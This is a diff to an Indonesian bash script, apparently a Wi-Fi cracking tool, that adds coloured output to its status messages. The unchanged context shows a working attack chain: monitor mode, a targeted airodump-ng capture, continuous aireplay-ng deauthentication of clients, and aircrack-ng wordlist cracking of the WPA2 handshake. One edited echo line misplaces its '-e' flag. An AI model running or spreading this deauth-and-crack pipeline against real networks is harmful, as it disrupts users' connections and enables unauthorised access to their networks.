@@ -28,13 +28,15 @@
 ############################################################################
 
 # var warna
-m="\e[1;31m"
-r="\e[0m"
-# h="\e[1;32m"
+m="\e[1;31m"   # merah
+r="\e[0m"      # reset
+b="\e[1;34m"   # biru
+h="\e[1;32m"   # hijau
+p="\e[1;37m"   # putih
 
 function cek_root(){
         if [[ "$EUID" -ne 0 ]]; then
-                echo "[-]  Program ini harus dijalankan sebagai root."
+                echo -e "${m}[-] ${p}Program ini harus dijalankan sebagai root.${r}"
                 exit 1
         fi
 }
@@ -68,14 +70,14 @@ function pemilihan_antarmuka_jaringan(){
                         antarmuka_jaringan="${antarmuka_jaringan_yang_tersedia[$memlih_antarmuka_jaringan]}"
                         break
                 else
-                        echo "[-] Antarmuka jaringan ${memlih_antarmuka_jaringan} tidak ditemukan. Silahkan pilih lagi."
+                        echo -e "${m}[-] ${p}Antarmuka jaringan ${memlih_antarmuka_jaringan} tidak ditemukan. Silahkan pilih lagi.${r}"
                 fi
         done
 }
 
 function mengaktifkan_mode_monitor(){
         echo ""
-        echo "[*] Mengaktifkan mode monitor pada antarmuka jaringan ${antarmuka_jaringan} menggunakan airmon-ng..."
+        echo -e "${b}[*] ${p}Mengaktifkan mode monitor pada antarmuka jaringan ${antarmuka_jaringan} menggunakan airmon-ng...${r}"
         sleep 3
         airmon-ng check kill
         airmon-ng start "${antarmuka_jaringan}"
@@ -83,7 +85,7 @@ function mengaktifkan_mode_monitor(){
 
 function menonaktifkan_mode_monitor(){
         echo ""
-        echo "[*] Menonaktifkan mode monitor pada antarmuka jaringan ${antarmuka_jaringan} menggunakan airmon-ng..."
+        echo -e "${b}[*] ${p}Menonaktifkan mode monitor pada antarmuka jaringan ${antarmuka_jaringan} menggunakan airmon-ng...${r}"
         sleep 3
         airmon-ng sleep "${antarmuka_jaringan}"
         systemctl restart NetworkManager
@@ -91,7 +93,7 @@ function menonaktifkan_mode_monitor(){
 
 function memindai_jaringan_wifi(){
         echo ""
-        echo "[*] Memindai jaringan Wi-Fi menggunakan airodump-ng pada antarmuka jaringan ${antarmuka_jaringan}..."
+        echo -e "${b}[*] ${p}Memindai jaringan Wi-Fi menggunakan airodump-ng pada antarmuka jaringan ${antarmuka_jaringan}...${r}"
         sleep 3
         airodump-ng "${antarmuka_jaringan}"
         echo ""
@@ -102,12 +104,12 @@ function jelajahi_target(){
         while true; do
                 read -p "Silahkan masukkan alamat MAC Access Point (BSSID): " bssid
                 if [[ -z "${bssid}" ]] || [[ ! "${bssid}" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
-                        echo "[-] Alamat MAC Access Point (BSSID) tidak benar. Harap masukkan alamat MAC Access Point (BSSID) yang benar (contoh: XX:XX:XX:XX:XX:XX)."
+                        echo -e "${m}[-] ${p}Alamat MAC Access Point (BSSID) tidak benar. Harap masukkan alamat MAC Access Point (BSSID) yang benar (contoh: XX:XX:XX:XX:XX:XX).${r}"
                 else
                         while true; do
                                 read -p "Silahkan masukkan nomor channel yang digunakan oleh Access Point: " channel
                                 if [[ -z "${channel}" ]] || ! [[ "${channel}" =~ ^[0-9]+$ ]]; then
-                                        echo "[-] Nomor channel tidak benar. Harap masukkan nomor channel yang benar."
+                                        echo -e "${m}[-] ${p}Nomor channel tidak benar. Harap masukkan nomor channel yang benar.${r}"
                                 else
                                         break
                                 fi
@@ -136,14 +138,14 @@ function tangkap_handshake(){
         # nama untuk file handshake
         nama_untuk_file_handshake="${bssid}_${waktu_saat_ini}"
         echo ""
-        echo "[*] Menangkap Handshake menggunakan airodump-ng pada antarmuka jaringan ${antarmuka_jaringan}..."
+        echo -e "${b}[*] ${p}Menangkap Handshake menggunakan airodump-ng pada antarmuka jaringan ${antarmuka_jaringan}...${r}"
         sleep 3
         xterm -geometry "${geometry_airodump}" -e "timeout ${timeout_airodump} airodump-ng --bssid ${bssid} --channel ${channel} --write ${nama_untuk_file_handshake} ${antarmuka_jaringan}" &
         airodump_pid=$!
         sleep 5
         # timeout aireplay-ng
         timeout_aireplay=20
-        echo "[*] Mengirimkan paket deauthentikasi menggunakan aireplay-ng pada antarmuka jaringan ${antarmuka_jaringan}..."
+        echo -e "${b}[*] ${p}Mengirimkan paket deauthentikasi menggunakan aireplay-ng pada antarmuka jaringan ${antarmuka_jaringan}...${r}"
         sleep 3
         xterm -geometry "${geometry_aireplay}" -e "timeout ${timeout_aireplay} aireplay-ng --deauth 0 -a ${bssid} ${antarmuka_jaringan}" &
         aireplay_pid=$!
@@ -157,7 +159,7 @@ function tangkap_handshake(){
         # menghapus semua file csv dan xml
         rm *csv *xml
         mv "${file_handshake_airodump}" "${folder_file_handshake}"
-        echo "[+] File Handshake tersimpan di: ${folder_file_handshake}${file_handshake_airodump}."
+        echo -e "${h}[+] ${p}File Handshake tersimpan di: ${folder_file_handshake}${file_handshake_airodump}.${r}"
         sleep 3
 }
 
@@ -220,13 +222,13 @@ function masukkan_jalur_file_handshake(){
                                 if [[ "${jalur_file_handsake##*.}" == "cap" ]]; then
                                         break
                                 else
-                                        echo "[-] File handshake ${jalur_file_handsake} tidak benar. Harap masukkan file Handshake yang benar (.cap)."
+                                        echo -e "${m}[-] ${p}File handshake ${jalur_file_handsake} tidak benar. Harap masukkan file Handshake yang benar (.cap).${r}"
                                 fi
                         else
-                                echo "[-] File handshake ${jalur_file_handsake} tidak ditemukan."
+                                echo -e "${m}[-] ${p}File handshake ${jalur_file_handsake} tidak ditemukan.${r}"
                         fi
                 else
-                                echo "[-] Jalur file Handshake tidak boleh kosong."
+                                echo -e "${m}[-] ${p}Jalur file Handshake tidak boleh kosong.${r}"
                 fi
         done
 }
@@ -240,15 +242,15 @@ function masukkan_jalur_file_wordlist(){
                                 # wordlist default yang digunakan oleh wush-ng
                                 wordlist="${jalur_file_wordlist}"
                                 echo ""
-                                echo "[*] Mendeskripsi kata sandi jaringan WPA2 menggunakan aircrack-ng pada file Handshake  ${folder_file_handshake}${file_handshake_airodump}."
+                                echo -e "${b}[*] ${p}Mendeskripsi kata sandi jaringan WPA2 menggunakan aircrack-ng pada file Handshake  ${folder_file_handshake}${file_handshake_airodump}.${r}"
                                 sleep 3
                                 aircrack-ng -w "${wordlist}" "${folder_file_handshake}${file_handshake_airodump}"
                                 break
                         else
-                                echo "[-] File wordlist ${jalur_file_wordlist} tidak ditemukan."
+                                echo -e "${m}[-] ${p}File wordlist ${jalur_file_wordlist} tidak ditemukan.${r}"
                         fi
                 else
-                        echo "[-] Jalur file wordlist tidak boleh kosong."
+                        echo -e "${m}[-] ${p}Jalur file wordlist tidak boleh kosong.${r}"
                 fi
         done
 }
@@ -268,7 +270,7 @@ function mendeskripsi_kata_sandi_jaringan_wpa2(){
                                 masukkan_jalur_file_handshake
                         break
                 else
-                        echo [-] "Masukan tidak valid. Harap masukkan Y atau N."
+                        echo [-] -e "${p}Masukan tidak valid. Harap masukkan Y atau N.${r}"
                 fi
                 done
         else
